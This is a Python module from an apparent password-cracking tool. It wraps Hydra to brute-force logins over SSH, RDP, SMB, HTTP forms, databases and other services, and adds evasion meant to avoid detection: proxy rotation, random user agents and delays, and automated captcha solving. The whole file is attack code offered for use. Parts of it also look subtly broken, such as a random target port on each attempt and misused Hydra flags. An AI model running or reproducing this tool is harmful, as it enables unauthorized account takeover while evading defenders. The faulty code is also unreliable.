# core/hydra_wrapper.py
import random
import subprocess
import os
import time
import logging
import requests
from utils.helpers import rotate_proxy, solve_captcha, get_random_user_agent
from utils.logger import setup_logging

logger = setup_logging("output/logs/passripperhydra.log")

def brute_force_online(target_url, service_type, username, passwords, proxy_enabled, captcha_enabled):
    """
    Perform online brute-force attacks using Hydra with enhanced stealth.
    Args:
        target_url (str): Target URL.
        service_type (str): Service type (e.g., SSH, HTTP-Form).
        username (str): Username or list path.
        passwords (list): List of passwords.
        proxy_enabled (bool): Enable proxy rotation.
        captcha_enabled (bool): Enable captcha solving.
    Returns:
        list: Attack results.
    """
    results = []
    pwd_file = "temp_passwords.txt"
    proxy = rotate_proxy() if proxy_enabled else None
    try:
        logger.info(f"Starting online brute-force on {target_url} ({service_type})...")
        with open(pwd_file, "w") as f:
            for pwd in passwords:
                f.write(f"{pwd}\n")
        
        # Extended protocol support
        service_map = {
            "SSH": "ssh", "HTTP-Form": "http-post-form", "FTP": "ftp",
            "SMB": "smb", "RDP": "rdp", "Telnet": "telnet", "MySQL": "mysql",
            "LDAP": "ldap", "PostgreSQL": "postgres", "SNMP": "snmp", "SIP": "sip"
        }
        hydra_service = service_map.get(service_type, "ssh")
        
        # Stealth enhancements
        max_attempts = 5
        for attempt in range(max_attempts):
            user_agent = get_random_user_agent()
            delay = random.uniform(5, 15)  # Randomized delay
            threads = random.randint(1, 4)  # Randomized threads
            cmd = [
                "hydra", "-l", username, "-P", pwd_file,
                "-s", str(random.randint(1, 65535)),  # Randomize port
                "-t", str(threads),  # Dynamic threads
                "-w", str(delay),  # Randomized wait time
                "-U", user_agent,  # Random user-agent
                "-f",  # Exit after first success
                target_url, hydra_service
            ]
            if proxy:
                cmd.extend(["-x", proxy])
            
            try:
                output = subprocess.run(cmd, capture_output=True, text=True, timeout=600, check=True).stdout
                
                # Advanced captcha handling
                if "captcha" in output.lower() and captcha_enabled:
                    logger.info("Captcha detected, attempting to solve...")
                    captcha_solution = solve_captcha(target_url, attempt + 1)
                    if captcha_solution:
                        cmd.append(f"-C {captcha_solution}")
                        output = subprocess.run(cmd, capture_output=True, text=True, timeout=600, check=True).stdout
                    else:
                        logger.warning("Captcha solving failed.")
                
                # Parse Hydra output
                for line in output.splitlines():
                    if "[SUCCESS]" in line:
                        password = line.split("password: ")[1].strip()
                        results.append({
                            "target": target_url,
                            "mode": "Online",
                            "username": username,
                            "password": password,
                            "status": "Cracked"
                        })
                        logger.info(f"Successfully cracked {target_url}: {username}:{password}")
                        return results
                break
            except subprocess.SubprocessError as e:
                logger.warning(f"Attempt {attempt + 1}/{max_attempts} failed: {str(e)}. Retrying...")
                proxy = rotate_proxy() if proxy_enabled else None
                time.sleep(delay)
        
        if not results:
            results.append({"target": target_url, "mode": "Online", "username": username, "status": "Failed"})
            logger.info(f"Online brute-force failed for {target_url} after {max_attempts} attempts.")
    except Exception as e:
        logger.error(f"Online brute-force failed: {str(e)}")
        results.append({"target": target_url, "mode": "Online", "username": username, "status": f"Error: {str(e)}"})
    finally:
        if os.path.exists(pwd_file):
            os.remove(pwd_file)
    return results